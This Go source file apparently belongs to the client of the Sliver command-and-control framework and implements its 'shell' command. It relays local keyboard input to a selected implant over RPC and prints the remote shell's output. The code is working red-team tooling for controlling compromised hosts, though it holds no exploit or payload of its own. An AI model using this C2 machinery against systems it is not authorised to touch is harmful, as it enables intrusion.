package command

import (
	"fmt"
	"io"
	"os"
	consts "sliver/client/constants"
	pb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	"sync"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

var (
	Shells = shells{
		recievers: &map[uint32]chan []byte{},
		mutex:     &sync.RWMutex{},
	}
)

type shells struct {
	recievers *map[uint32]chan []byte
	mutex     *sync.RWMutex
}

func (s *shells) AddReciever(ID uint32, recv chan []byte) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.recievers)[ID] = recv
}

func (s *shells) RemoveReciever(ID uint32, recv chan []byte) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	close((*s.recievers)[ID])
	delete((*s.recievers), ID)
}

func shell(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	shellReq := &pb.ShellReq{SliverID: ActiveSliver.Sliver.ID}
	shellReqData, _ := proto.Marshal(shellReq)
	resp := rpc(&pb.Envelope{
		Type: consts.ShellStr,
		Data: shellReqData,
	}, defaultTimeout)
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}

	shellData := &sliverpb.ShellData{}
	proto.Unmarshal(resp.Data, shellData)
	recv := make(chan []byte)

	Shells.AddReciever(shellData.ID, recv)
	go func() {
		for data := range recv {
			os.Stdout.Write(data)
		}
	}()

	readBuf := make([]byte, 16)
	for {
		n, err := os.Stdin.Read(readBuf)
		if err == io.EOF {
			return
		}
		data, err := proto.Marshal(&sliverpb.ShellData{
			ID:       shellData.ID,
			Stdin:    readBuf[:n],
			SliverID: ActiveSliver.Sliver.ID,
		})
		go rpc(&pb.Envelope{
			Type: consts.ShellDataStr,
			Data: data,
		}, defaultTimeout)
	}
}
